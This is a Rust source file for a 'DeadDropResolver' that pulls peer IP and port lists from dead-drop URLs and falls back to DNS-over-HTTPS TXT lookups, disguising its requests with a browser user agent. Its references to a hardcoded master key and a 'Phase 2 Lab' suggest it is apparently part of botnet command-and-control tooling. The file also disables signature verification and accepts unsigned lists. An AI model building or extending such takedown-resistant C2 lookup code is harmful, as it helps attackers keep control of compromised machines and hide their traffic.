use reqwest::Client;
use std::error::Error;
use log::{info, debug, warn};
use base64::{Engine as _, engine::general_purpose};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};

// Public Key of the Master (Hardcoded/Embedded)
// For now, using a dummy key or deriving from a fixed seed for testing
const MASTER_PUB_KEY_HEX: &str = "abcde..."; // Placeholder

use serde::Deserialize;

#[derive(Deserialize)]
struct DohResponse {
    #[serde(rename = "Answer")]
    answer: Option<Vec<DohAnswer>>,
}

#[derive(Deserialize)]
struct DohAnswer {
    data: String,
}

pub struct DeadDropResolver {
    client: Client,
    sources: Vec<String>, // Dead Drop URLs
    domains: Vec<String>, // DoH Domains
}

impl DeadDropResolver {
    pub fn new(sources: Vec<String>, domains: Vec<String>) -> Self {
        Self {
            client: Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .build()
                .unwrap_or_default(),
            sources,
            domains,
        }
    }

    /// Iterates through sources and tries to fetch valid config
    pub async fn resolve(&self) -> Option<Vec<(String, u16)>> {
        // 1. Try Dead Drops (URLs)
        for url in &self.sources {
            info!("Trying Dead-Drop Source: {}", url);
            match self.fetch_and_parse(url).await {
                Ok(peers) => {
                    info!("Successfully resolved {} peers from {}", peers.len(), url);
                    return Some(peers);
                }
                Err(e) => {
                    warn!("Failed to resolve from {}: {}", url, e);
                }
            }
        }

        // 2. Try DNS over HTTPS (DoH)
        for domain in &self.domains {
            info!("Trying DoH for Domain: {}", domain);
            match self.resolve_doh_txt(domain).await {
                Ok(peers) => {
                    info!("Successfully resolved {} peers via DoH ({})", peers.len(), domain);
                    return Some(peers);
                }
                Err(e) => {
                    warn!("Failed to resolve DoH {}: {}", domain, e);
                }
            }
        }

        None
    }

    async fn resolve_doh_txt(&self, domain: &str) -> Result<Vec<(String, u16)>, Box<dyn Error>> {
        let url = format!("https://dns.google/resolve?name={}&type=TXT", domain);
        let resp = self.client.get(&url).send().await?.json::<DohResponse>().await?;
        
        if let Some(answers) = resp.answer {
            for answer in answers {
                // DoH TXT data often comes with quotes, e.g. "ip:port;..."
                let raw_txt = answer.data.trim_matches('"').replace("\\\"", "\"");
                // Attempt to parse this TXT record
                if let Ok(peers) = self.parse_ip_list(&raw_txt) {
                    return Ok(peers);
                }
            }
        }
        
        Err("No valid TXT records found".into())
    }

    async fn fetch_and_parse(&self, url: &str) -> Result<Vec<(String, u16)>, Box<dyn Error>> {
        let resp = self.client.get(url).send().await?;
        let text = resp.text().await?;
        
        // Expected Format: "SIG:<base64_sig>|MSG:<base64_msg>"
        // This is a simplified parser
        let parts: Vec<&str> = text.trim().split('|').collect();
        if parts.len() != 2 {
             // Fallback to unsigned for dev/test if strict mode is off
             // return Err("Invalid format".into());
             // For Phase 2 Lab, assume raw base64 of IP list
             let decoded = general_purpose::STANDARD.decode(text.trim())?;
             // ... parsing logic ...
             return self.parse_ip_list(&String::from_utf8(decoded)?);
        }
        
        // Real Verification Logic (Placeholder for full implementation)
        // let sig_bytes = general_purpose::STANDARD.decode(parts[0].strip_prefix("SIG:").unwrap_or(""))?;
        // let msg_bytes = general_purpose::STANDARD.decode(parts[1].strip_prefix("MSG:").unwrap_or(""))?;
        
        // let vk_bytes = hex::decode(MASTER_PUB_KEY_HEX)?;
        // let vk = VerifyingKey::from_bytes(&vk_bytes.try_into().unwrap())?;
        // let signature = Signature::from_bytes(&sig_bytes.try_into().unwrap());
        
        // vk.verify(&msg_bytes, &signature)?;
        
        // Ok(self.parse_ip_list(&String::from_utf8(msg_bytes)?)?)
        Err("Signature Verification Not Fully Implemented".into())
    }

    fn parse_ip_list(&self, decoded_str: &str) -> Result<Vec<(String, u16)>, Box<dyn Error>> {
        let mut peers = Vec::new();
        for part in decoded_str.split(';') {
            if part.is_empty() { continue; }
            if let Some((ip, port_str)) = part.split_once(':') {
                if let Ok(port) = port_str.parse::<u16>() {
                    peers.push((ip.to_string(), port));
                }
            }
        }

        if peers.is_empty() {
            return Err("No valid peers found".into());
        }

        Ok(peers)
    }
}
